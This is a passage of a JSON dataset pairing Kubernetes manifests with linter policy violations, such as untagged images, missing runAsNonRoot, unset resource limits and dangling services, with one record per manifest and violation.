    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"clear\" has memory limit 0"
  },
  {
    "id": "7931",
    "manifest_path": "data/manifests/the_stack_sample/sample_2917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: expiration-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: expiration\n  template:\n    metadata:\n      labels:\n        app: expiration\n    spec:\n      containers:\n      - name: expiration\n        image: junkit-expiration\n        imagePullPolicy: Never\n        env:\n        - name: NODE_ENV\n          valueFrom:\n            secretKeyRef:\n              name: env-secret\n              key: NODE_ENV\n        - name: NATS_URL\n          value: http://nats-service:4222\n        - name: NATS_CLUSTER_ID\n          value: junk-it\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: REDIS_HOST\n          value: expiration-redis-service\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"expiration\" is using an invalid container image, \"junkit-expiration\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7932",
    "manifest_path": "data/manifests/the_stack_sample/sample_2917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: expiration-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: expiration\n  template:\n    metadata:\n      labels:\n        app: expiration\n    spec:\n      containers:\n      - name: expiration\n        image: junkit-expiration\n        imagePullPolicy: Never\n        env:\n        - name: NODE_ENV\n          valueFrom:\n            secretKeyRef:\n              name: env-secret\n              key: NODE_ENV\n        - name: NATS_URL\n          value: http://nats-service:4222\n        - name: NATS_CLUSTER_ID\n          value: junk-it\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: REDIS_HOST\n          value: expiration-redis-service\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"expiration\" does not have a read-only root file system"
  },
  {
    "id": "7933",
    "manifest_path": "data/manifests/the_stack_sample/sample_2917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: expiration-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: expiration\n  template:\n    metadata:\n      labels:\n        app: expiration\n    spec:\n      containers:\n      - name: expiration\n        image: junkit-expiration\n        imagePullPolicy: Never\n        env:\n        - name: NODE_ENV\n          valueFrom:\n            secretKeyRef:\n              name: env-secret\n              key: NODE_ENV\n        - name: NATS_URL\n          value: http://nats-service:4222\n        - name: NATS_CLUSTER_ID\n          value: junk-it\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: REDIS_HOST\n          value: expiration-redis-service\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"expiration\" is not set to runAsNonRoot"
  },
  {
    "id": "7934",
    "manifest_path": "data/manifests/the_stack_sample/sample_2917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: expiration-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: expiration\n  template:\n    metadata:\n      labels:\n        app: expiration\n    spec:\n      containers:\n      - name: expiration\n        image: junkit-expiration\n        imagePullPolicy: Never\n        env:\n        - name: NODE_ENV\n          valueFrom:\n            secretKeyRef:\n              name: env-secret\n              key: NODE_ENV\n        - name: NATS_URL\n          value: http://nats-service:4222\n        - name: NATS_CLUSTER_ID\n          value: junk-it\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: REDIS_HOST\n          value: expiration-redis-service\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"expiration\" has cpu request 0"
  },
  {
    "id": "7935",
    "manifest_path": "data/manifests/the_stack_sample/sample_2917.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: expiration-deployment\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: expiration\n  template:\n    metadata:\n      labels:\n        app: expiration\n    spec:\n      containers:\n      - name: expiration\n        image: junkit-expiration\n        imagePullPolicy: Never\n        env:\n        - name: NODE_ENV\n          valueFrom:\n            secretKeyRef:\n              name: env-secret\n              key: NODE_ENV\n        - name: NATS_URL\n          value: http://nats-service:4222\n        - name: NATS_CLUSTER_ID\n          value: junk-it\n        - name: NATS_CLIENT_ID\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: REDIS_HOST\n          value: expiration-redis-service\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"expiration\" has memory limit 0"
  },
  {
    "id": "7936",
    "manifest_path": "data/manifests/the_stack_sample/sample_2919.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: db\n  name: db\n  namespace: logs\nspec:\n  type: ClusterIP\n  ports:\n  - name: db-service\n    port: 5432\n    targetPort: 5432\n  selector:\n    app: db\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:db])"
  },
  {
    "id": "7937",
    "manifest_path": "data/manifests/the_stack_sample/sample_2922.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ebs-snapshots-job\nspec:\n  template:\n    metadata:\n      name: ebs-snapshots-job\n    spec:\n      containers:\n      - name: ebs-snapshots-job\n        image: quay.io/smile/ebs-snapshooter\n        env:\n        - name: AWS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-acces-key-id\n        - name: AWS_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-secret-acces-key\n        - name: AWS_REGION_NAME\n          value: eu-west-1\n        - name: AWS_SNS_ARN\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-sns-arn\n        - name: KEEP_WEEK\n          value: '2'\n        - name: KEEP_DAY\n          value: '3'\n        - name: KEEP_MONTH\n          value: '1'\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "7938",
    "manifest_path": "data/manifests/the_stack_sample/sample_2922.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ebs-snapshots-job\nspec:\n  template:\n    metadata:\n      name: ebs-snapshots-job\n    spec:\n      containers:\n      - name: ebs-snapshots-job\n        image: quay.io/smile/ebs-snapshooter\n        env:\n        - name: AWS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-acces-key-id\n        - name: AWS_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-secret-acces-key\n        - name: AWS_REGION_NAME\n          value: eu-west-1\n        - name: AWS_SNS_ARN\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-sns-arn\n        - name: KEEP_WEEK\n          value: '2'\n        - name: KEEP_DAY\n          value: '3'\n        - name: KEEP_MONTH\n          value: '1'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ebs-snapshots-job\" is using an invalid container image, \"quay.io/smile/ebs-snapshooter\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7939",
    "manifest_path": "data/manifests/the_stack_sample/sample_2922.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ebs-snapshots-job\nspec:\n  template:\n    metadata:\n      name: ebs-snapshots-job\n    spec:\n      containers:\n      - name: ebs-snapshots-job\n        image: quay.io/smile/ebs-snapshooter\n        env:\n        - name: AWS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-acces-key-id\n        - name: AWS_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-secret-acces-key\n        - name: AWS_REGION_NAME\n          value: eu-west-1\n        - name: AWS_SNS_ARN\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-sns-arn\n        - name: KEEP_WEEK\n          value: '2'\n        - name: KEEP_DAY\n          value: '3'\n        - name: KEEP_MONTH\n          value: '1'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ebs-snapshots-job\" does not have a read-only root file system"
  },
  {
    "id": "7940",
    "manifest_path": "data/manifests/the_stack_sample/sample_2922.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ebs-snapshots-job\nspec:\n  template:\n    metadata:\n      name: ebs-snapshots-job\n    spec:\n      containers:\n      - name: ebs-snapshots-job\n        image: quay.io/smile/ebs-snapshooter\n        env:\n        - name: AWS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-acces-key-id\n        - name: AWS_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-secret-acces-key\n        - name: AWS_REGION_NAME\n          value: eu-west-1\n        - name: AWS_SNS_ARN\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-sns-arn\n        - name: KEEP_WEEK\n          value: '2'\n        - name: KEEP_DAY\n          value: '3'\n        - name: KEEP_MONTH\n          value: '1'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ebs-snapshots-job\" is not set to runAsNonRoot"
  },
  {
    "id": "7941",
    "manifest_path": "data/manifests/the_stack_sample/sample_2922.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ebs-snapshots-job\nspec:\n  template:\n    metadata:\n      name: ebs-snapshots-job\n    spec:\n      containers:\n      - name: ebs-snapshots-job\n        image: quay.io/smile/ebs-snapshooter\n        env:\n        - name: AWS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-acces-key-id\n        - name: AWS_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-secret-acces-key\n        - name: AWS_REGION_NAME\n          value: eu-west-1\n        - name: AWS_SNS_ARN\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-sns-arn\n        - name: KEEP_WEEK\n          value: '2'\n        - name: KEEP_DAY\n          value: '3'\n        - name: KEEP_MONTH\n          value: '1'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ebs-snapshots-job\" has cpu request 0"
  },
  {
    "id": "7942",
    "manifest_path": "data/manifests/the_stack_sample/sample_2922.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: ebs-snapshots-job\nspec:\n  template:\n    metadata:\n      name: ebs-snapshots-job\n    spec:\n      containers:\n      - name: ebs-snapshots-job\n        image: quay.io/smile/ebs-snapshooter\n        env:\n        - name: AWS_ACCESS_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-acces-key-id\n        - name: AWS_SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-secret-acces-key\n        - name: AWS_REGION_NAME\n          value: eu-west-1\n        - name: AWS_SNS_ARN\n          valueFrom:\n            secretKeyRef:\n              name: ebs-snapshooter-seretes\n              key: aws-sns-arn\n        - name: KEEP_WEEK\n          value: '2'\n        - name: KEEP_DAY\n          value: '3'\n        - name: KEEP_MONTH\n          value: '1'\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ebs-snapshots-job\" has memory limit 0"
  },
  {
    "id": "7943",
    "manifest_path": "data/manifests/the_stack_sample/sample_2923.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: vald-lb-gateway\n  labels:\n    app.kubernetes.io/name: vald\n    helm.sh/chart: vald-v1.0.4\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/instance: RELEASE-NAME\n    app.kubernetes.io/version: v1.0.4\n    app.kubernetes.io/component: gateway-lb\nspec:\n  ports:\n  - name: grpc\n    port: 8081\n    targetPort: 8081\n    protocol: TCP\n  - name: readiness\n    port: 3001\n    targetPort: 3001\n    protocol: TCP\n  - name: pprof\n    port: 6060\n    targetPort: 6060\n    protocol: TCP\n  selector:\n    app.kubernetes.io/name: vald\n    app.kubernetes.io/component: gateway\n  clusterIP: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app.kubernetes.io/component:gateway app.kubernetes.io/name:vald])"
  },
  {
    "id": "7944",
    "manifest_path": "data/manifests/the_stack_sample/sample_2927.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mongo-pod\n  labels:\n    component: mongo\nspec:\n  containers:\n  - name: mongo\n    image: mongo\n    ports:\n    - containerPort: 27017\n    env:\n    - name: MONGO_INITDB_ROOT_USERNAME\n      value: user\n    - name: MONGO_INITDB_ROOT_PASSWORD\n      value: pw\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mongo\" is using an invalid container image, \"mongo\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "7945",
    "manifest_path": "data/manifests/the_stack_sample/sample_2927.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mongo-pod\n  labels:\n    component: mongo\nspec:\n  containers:\n  - name: mongo\n    image: mongo\n    ports:\n    - containerPort: 27017\n    env:\n    - name: MONGO_INITDB_ROOT_USERNAME\n      value: user\n    - name: MONGO_INITDB_ROOT_PASSWORD\n      value: pw\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mongo\" does not have a read-only root file system"
  },
  {
    "id": "7946",
    "manifest_path": "data/manifests/the_stack_sample/sample_2927.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mongo-pod\n  labels:\n    component: mongo\nspec:\n  containers:\n  - name: mongo\n    image: mongo\n    ports:\n    - containerPort: 27017\n    env:\n    - name: MONGO_INITDB_ROOT_USERNAME\n      value: user\n    - name: MONGO_INITDB_ROOT_PASSWORD\n      value: pw\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mongo\" is not set to runAsNonRoot"
  },
  {
    "id": "7947",
    "manifest_path": "data/manifests/the_stack_sample/sample_2927.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mongo-pod\n  labels:\n    component: mongo\nspec:\n  containers:\n  - name: mongo\n    image: mongo\n    ports:\n    - containerPort: 27017\n    env:\n    - name: MONGO_INITDB_ROOT_USERNAME\n      value: user\n    - name: MONGO_INITDB_ROOT_PASSWORD\n      value: pw\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mongo\" has cpu request 0"
  },
  {
    "id": "7948",
    "manifest_path": "data/manifests/the_stack_sample/sample_2927.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mongo-pod\n  labels:\n    component: mongo\nspec:\n  containers:\n  - name: mongo\n    image: mongo\n    ports:\n    - containerPort: 27017\n    env:\n    - name: MONGO_INITDB_ROOT_USERNAME\n      value: user\n    - name: MONGO_INITDB_ROOT_PASSWORD\n      value: pw\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mongo\" has memory limit 0"
  },
  {
    "id": "7949",
    "manifest_path": "data/manifests/the_stack_sample/sample_2928.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n  name: observatorium-xyz-observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-xyz\n      app.kubernetes.io/name: observatorium-api\n      app.kubernetes.io/part-of: observatorium\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-xyz\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/part-of: observatorium\n        app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --log.level=warn\n        - --metrics.read.endpoint=http://observatorium-xyz-thanos-query-frontend.observatorium.svc.cluster.local:9090\n        - --metrics.write.endpoint=http://observatorium-xyz-thanos-receive.observatorium.svc.cluster.local:19291\n        - --logs.read.endpoint=http://observatorium-xyz-loki-query-frontend-http.observatorium.svc.cluster.local:3100\n        - --logs.tail.endpoint=http://observatorium-xyz-loki-querier-http.observatorium.svc.cluster.local:3100\n        - --logs.write.endpoint=http://observatorium-xyz-loki-distributor-http.observatorium.svc.cluster.local:3100\n        - --middleware.rate-limiter.grpc-address=observatorium-xyz-gubernator.observatorium.svc.cluster.local:8081\n        image: quay.io/observatorium/api:main-2021-11-30-v0.1.2-106-g2adff5f\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts: []\n      serviceAccountName: observatorium-xyz-observatorium-api\n      volumes: []\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"observatorium-api\" does not have a read-only root file system"
  },
  {
    "id": "7950",
    "manifest_path": "data/manifests/the_stack_sample/sample_2928.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n  name: observatorium-xyz-observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-xyz\n      app.kubernetes.io/name: observatorium-api\n      app.kubernetes.io/part-of: observatorium\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-xyz\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/part-of: observatorium\n        app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --log.level=warn\n        - --metrics.read.endpoint=http://observatorium-xyz-thanos-query-frontend.observatorium.svc.cluster.local:9090\n        - --metrics.write.endpoint=http://observatorium-xyz-thanos-receive.observatorium.svc.cluster.local:19291\n        - --logs.read.endpoint=http://observatorium-xyz-loki-query-frontend-http.observatorium.svc.cluster.local:3100\n        - --logs.tail.endpoint=http://observatorium-xyz-loki-querier-http.observatorium.svc.cluster.local:3100\n        - --logs.write.endpoint=http://observatorium-xyz-loki-distributor-http.observatorium.svc.cluster.local:3100\n        - --middleware.rate-limiter.grpc-address=observatorium-xyz-gubernator.observatorium.svc.cluster.local:8081\n        image: quay.io/observatorium/api:main-2021-11-30-v0.1.2-106-g2adff5f\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts: []\n      serviceAccountName: observatorium-xyz-observatorium-api\n      volumes: []\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"observatorium-xyz-observatorium-api\" not found"
  },
  {
    "id": "7951",
    "manifest_path": "data/manifests/the_stack_sample/sample_2928.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n  name: observatorium-xyz-observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-xyz\n      app.kubernetes.io/name: observatorium-api\n      app.kubernetes.io/part-of: observatorium\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-xyz\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/part-of: observatorium\n        app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --log.level=warn\n        - --metrics.read.endpoint=http://observatorium-xyz-thanos-query-frontend.observatorium.svc.cluster.local:9090\n        - --metrics.write.endpoint=http://observatorium-xyz-thanos-receive.observatorium.svc.cluster.local:19291\n        - --logs.read.endpoint=http://observatorium-xyz-loki-query-frontend-http.observatorium.svc.cluster.local:3100\n        - --logs.tail.endpoint=http://observatorium-xyz-loki-querier-http.observatorium.svc.cluster.local:3100\n        - --logs.write.endpoint=http://observatorium-xyz-loki-distributor-http.observatorium.svc.cluster.local:3100\n        - --middleware.rate-limiter.grpc-address=observatorium-xyz-gubernator.observatorium.svc.cluster.local:8081\n        image: quay.io/observatorium/api:main-2021-11-30-v0.1.2-106-g2adff5f\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts: []\n      serviceAccountName: observatorium-xyz-observatorium-api\n      volumes: []\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"observatorium-api\" is not set to runAsNonRoot"
  },
  {
    "id": "7952",
    "manifest_path": "data/manifests/the_stack_sample/sample_2928.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n  name: observatorium-xyz-observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-xyz\n      app.kubernetes.io/name: observatorium-api\n      app.kubernetes.io/part-of: observatorium\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-xyz\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/part-of: observatorium\n        app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --log.level=warn\n        - --metrics.read.endpoint=http://observatorium-xyz-thanos-query-frontend.observatorium.svc.cluster.local:9090\n        - --metrics.write.endpoint=http://observatorium-xyz-thanos-receive.observatorium.svc.cluster.local:19291\n        - --logs.read.endpoint=http://observatorium-xyz-loki-query-frontend-http.observatorium.svc.cluster.local:3100\n        - --logs.tail.endpoint=http://observatorium-xyz-loki-querier-http.observatorium.svc.cluster.local:3100\n        - --logs.write.endpoint=http://observatorium-xyz-loki-distributor-http.observatorium.svc.cluster.local:3100\n        - --middleware.rate-limiter.grpc-address=observatorium-xyz-gubernator.observatorium.svc.cluster.local:8081\n        image: quay.io/observatorium/api:main-2021-11-30-v0.1.2-106-g2adff5f\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts: []\n      serviceAccountName: observatorium-xyz-observatorium-api\n      volumes: []\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"observatorium-api\" has cpu request 0"
  },
  {
    "id": "7953",
    "manifest_path": "data/manifests/the_stack_sample/sample_2928.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-xyz\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/part-of: observatorium\n    app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n  name: observatorium-xyz-observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-xyz\n      app.kubernetes.io/name: observatorium-api\n      app.kubernetes.io/part-of: observatorium\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-xyz\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/part-of: observatorium\n        app.kubernetes.io/version: main-2021-11-30-v0.1.2-106-g2adff5f\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --log.level=warn\n        - --metrics.read.endpoint=http://observatorium-xyz-thanos-query-frontend.observatorium.svc.cluster.local:9090\n        - --metrics.write.endpoint=http://observatorium-xyz-thanos-receive.observatorium.svc.cluster.local:19291\n        - --logs.read.endpoint=http://observatorium-xyz-loki-query-frontend-http.observatorium.svc.cluster.local:3100\n        - --logs.tail.endpoint=http://observatorium-xyz-loki-querier-http.observatorium.svc.cluster.local:3100\n        - --logs.write.endpoint=http://observatorium-xyz-loki-distributor-http.observatorium.svc.cluster.local:3100\n        - --middleware.rate-limiter.grpc-address=observatorium-xyz-gubernator.observatorium.svc.cluster.local:8081\n        image: quay.io/observatorium/api:main-2021-11-30-v0.1.2-106-g2adff5f\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts: []\n      serviceAccountName: observatorium-xyz-observatorium-api\n      volumes: []\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"observatorium-api\" has memory limit 0"
  },
  {
    "id": "7954",
    "manifest_path": "data/manifests/the_stack_sample/sample_2929.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: jx-pipelines-visualizer\n  labels:\n    app.kubernetes.io/name: jx-pipelines-visualizer\n    app.kubernetes.io/instance: jx-pipelines-visualizer\n    helm.sh/chart: jx-pipelines-visualizer-1.7.2\n    app.kubernetes.io/version: 1.7.2\n    app.kubernetes.io/managed-by: Helm\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jx-pipelines-visualizer\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: jx-pipelines-visualizer\n      app.kubernetes.io/instance: jx-pipelines-visualizer\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jx-pipelines-visualizer\n        app.kubernetes.io/instance: jx-pipelines-visualizer\n        helm.sh/chart: jx-pipelines-visualizer-1.7.2\n        app.kubernetes.io/version: 1.7.2\n        app.kubernetes.io/managed-by: Helm\n    spec:\n      containers:\n      - name: jx-pipelines-visualizer\n        image: ghcr.io/jenkins-x/jx-pipelines-visualizer:1.7.2\n        args:\n        - -namespace\n        - jx\n        - -resync-interval\n        - 60s\n        - -archived-logs-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | upper}}{{else}}{{.Branch}}{{end}}/{{.Build}}.log\n        - -archived-pipelines-url-template\n        - gs://logs-tf-jx-classic-wallaby-0aaac4b505b5/jenkins-x/logs/{{.Owner}}/{{.Repository}}/{{if\n          hasPrefix .Branch \"pr\"}}{{.Branch | 